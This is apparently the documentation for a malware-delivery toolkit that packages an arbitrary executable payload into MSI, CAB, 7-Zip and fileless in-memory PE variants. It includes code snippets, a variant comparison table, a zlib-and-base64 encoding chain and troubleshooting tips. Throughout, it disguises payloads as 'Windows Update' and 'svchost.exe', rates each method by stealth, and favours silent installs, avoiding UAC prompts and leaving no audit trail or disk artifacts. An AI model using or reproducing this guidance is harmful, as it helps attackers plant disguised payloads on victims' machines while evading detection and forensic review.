CODE SNIPPETS
═════════════

Basic Generation:
─────────────────
from oneclick_extraction_variants import OneClickExtractionVariant

payload = open("payload.exe", "rb").read()
variants = OneClickExtractionVariant.generate_all_variants(payload)

for method, variant in variants.items():
    print(f"{method}: {variant['installation_script']}")


Generate Specific Variant:
──────────────────────────
# MSI Variant
msi = OneClickExtractionVariant.generate_msi_variant(
    payload,
    product_name="Windows Update",
    version="10.0.1904"
)

# CAB Variant
cab = OneClickExtractionVariant.generate_cab_variant(
    payload,
    cabinet_name="system_update"
)

# 7-Zip Variant
sevenzip = OneClickExtractionVariant.generate_sevenzip_variant(
    payload,
    archive_name="data"
)

# Embedded PE Variant
pe = OneClickExtractionVariant.generate_embedded_pe_variant(
    payload,
    pe_name="svchost.exe"
)


Create Delivery Package:
────────────────────────
from oneclick_extraction_variants import VariantDeliveryPackage

package = VariantDeliveryPackage()
selectors = package.create_variant_selector(variants)
manifest = package.package_all_variants(variants)

# Save files
with open("selector.html", "w") as f:
    f.write(selectors["html_selector"])
with open("selector.bat", "w") as f:
    f.write(selectors["batch_selector"])


VARIANT CHARACTERISTICS
═══════════════════════

╔═══════════════════════════════════════════════════════════════════════════╗
║ MSI NATIVE (msi_native)                                                   ║
├─────────────────────────────────────────────────────────────────────────┤
│ What it does:      Uses Windows Installer (WiX Toolset)                 │
│ Launcher script:   install_msi.vbs                                      │
│ Compression:       Medium (80% of original)                             │
│ Speed:             Medium (2-3 seconds with UI)                         │
│ Stealth:           High (trusted Windows component)                     │
│ File artifacts:    Yes (MSI file created temporarily)                   │
│ Audit trail:       Yes (logged in Event Log)                            │
│ External tools:    No (msiexec is built-in)                             │
│ UAC prompt:        Usually yes (can be disabled)                        │
│ Best for:          Enterprise environments, proper deployment           │
│ Pros:  Legitimate UI, proper audit trail, enterprise approved           │
│ Cons:  Slower execution, requires UAC prompt, larger file               │
╚═══════════════════════════════════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════════╗
║ CABINET EXTRACTION (cab_extract)                                          ║
├─────────────────────────────────────────────────────────────────────────┤
│ What it does:      Windows Cabinet (.cab) extraction with expand.exe    │
│ Launcher script:   extract_cabinet.vbs                                  │
│ Compression:       Medium (70% of original)                             │
│ Speed:             Very Fast (<0.5 seconds)                             │
│ Stealth:           High (built-in Windows tool)                         │
│ File artifacts:    Yes (temporary extract directory)                    │
│ Audit trail:       Limited (no Event Log entry)                         │
│ External tools:    No (expand.exe is built-in)                          │
│ UAC prompt:        No                                                    │
│ Best for:          Fast deployment, minimal overhead                    │
│ Pros:  Very fast, no external tools, silent operation                   │
│ Cons:  Medium compression, temporary files left behind                  │
╚═══════════════════════════════════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════════╗
║ 7-ZIP EXTRACTION (sevenzip)                                               ║
├─────────────────────────────────────────────────────────────────────────┤
│ What it does:      7-Zip compression with smart extraction fallback     │
│ Launcher script:   extract_7zip.vbs                                     │
│ Compression:       Excellent (24% of original, 70-80% reduction)        │
│ Speed:             Fast (1-2 seconds decompression)                     │
│ Stealth:           Very High (compression obfuscation)                  │
│ File artifacts:    Yes (temporary archive and extract)                  │
│ Audit trail:       No                                                    │
│ External tools:    7-Zip or WinRAR (with fallback)                      │
│ UAC prompt:        No                                                    │
│ Best for:          Minimal file size, advanced obfuscation              │
│ Pros:  Best compression, multiple fallbacks, smart detection            │
│ Cons:  Requires external tool or fallback, slower extraction            │
╚═══════════════════════════════════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════════╗
║ EMBEDDED PE EXECUTION (embedded_pe)                                       ║
├─────────────────────────────────────────────────────────────────────────┤
│ What it does:      Direct PE execution from memory (fileless)           │
│ Launcher script:   execute_embedded.ps1                                 │
│ Compression:       Good (44% of original)                               │
│ Speed:             Instant (<100ms)                                      │
│ Stealth:           Maximum (completely fileless)                        │
│ File artifacts:    No (memory-only execution)                           │
│ Audit trail:       Minimal (no disk or registry trace)                  │
│ External tools:    No (PowerShell/C# built-in)                          │
│ UAC prompt:        No                                                    │
│ Best for:          Maximum stealth, zero artifacts                      │
│ Pros:  Fileless, instant execution, zero disk artifacts                 │
│ Cons:  Most complex, requires Windows API, memory-dependent             │

PAYLOAD ENCODING CHAIN
══════════════════════

[Original Payload]
        │
        ├─→ Zlib Compression
        │   (reduces size 60-80%)
        │
        ├─→ Base64 Encoding
        │   (safe text representation)
        │
        ├─→ Optional Chunking
        │   (if payload too large)
        │
        └─→ Embedded in Script
            (VBS, PS, Batch file)

Extraction reverses:
Base64 Decode → Zlib Decompress → [Original Payload]

TROUBLESHOOTING
═══════════════

MSI Variant:
├─ Issue: Installation fails
│  └─ Check: WiX Toolset installed, temp directory writable
├─ Issue: No UI appears
│  └─ Check: /qn flag (silent mode is intended)
└─ Issue: Cleanup doesn't work
   └─ Check: File not locked, permissions OK


CAB Variant:
├─ Issue: expand.exe fails
│  └─ Check: CAB format valid, expand.exe available
├─ Issue: Extraction too slow
│  └─ Check: Normal (complex archives take time)
└─ Issue: Leftover temp files
   └─ Check: Manual cleanup in %temp%


7-Zip Variant:
├─ Issue: No tool found
│  └─ Solution: Auto-fallback to built-in decompression
├─ Issue: Decompression fails
│  └─ Check: Archive integrity, format compatibility
└─ Issue: Memory usage high
   └─ Normal: 7-Zip needs RAM for decompression


Embedded PE Variant:
├─ Issue: Memory allocation fails
│  └─ Check: Sufficient RAM available
├─ Issue: Thread creation fails
│  └─ Check: PE format valid, API access OK
└─ Issue: No execution
   └─ Check: PE entry point, memory protection


PERFORMANCE TUNING
═══════════════════

For Speed:
└─ Use CAB Extract (fastest native extraction)
